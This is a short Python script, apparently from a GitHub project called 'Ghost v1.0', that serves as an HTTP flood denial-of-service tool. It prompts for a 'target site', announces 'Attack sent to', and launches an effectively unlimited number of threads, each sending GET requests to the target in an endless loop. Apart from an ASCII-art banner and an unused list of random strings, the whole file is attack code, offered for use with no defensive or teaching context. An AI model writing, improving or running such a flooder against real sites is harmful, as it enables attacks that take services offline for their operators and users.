# ========================================================================
#                     Ghost v1.0 github.com/AdvancedBan
#                            Made by AdvancedBan
#                              @0xAdvancedBan
# ========================================================================

import os
import requests as r
import random,threading

v = ["abvepdf","sdyfug","uvhzzze","rz_yef","ufzhaey","ovhuose","efopjuv","dofhf"]



print("  ▄████  ██░ ██  ▒█████    ██████ ▄▄▄█████▓")
print(" ██▒ ▀█▒▓██░ ██▒▒██▒  ██▒▒██    ▒ ▓  ██▒ ▓▒")
print("▒██░▄▄▄░▒██▀▀██░▒██░  ██▒░ ▓██▄   ▒ ▓██░ ▒░")
print("░▓█  ██▓░▓█ ░██ ▒██   ██░  ▒   ██▒░ ▓██▓ ░ ")
print("░▒▓███▀▒░▓█▒░██▓░ ████▓▒░▒██████▒▒  ▒██▒ ░ ")
print(" ░▒   ▒  ▒ ░░▒░▒░ ▒░▒░▒░ ▒ ▒▓▒ ▒ ░  ▒ ░░   ")              
print("  ░   ░  ▒ ░▒░ ░  ░ ▒ ▒░ ░ ░▒  ░ ░    ░    ")             
print("░ ░   ░  ░  ░░ ░░ ░ ░ ▒  ░  ░  ░    ░      ")                   
print("      ░  ░  ░  ░    ░ ░        ░           ")
print("")

target = input("Enter target site : ")
print("Attack sent to : " + target)


def ddos():
    while True:
        r.get(target)

for i in range(1000000000000000000000000000000):
    threading.Thread(target=ddos).start()
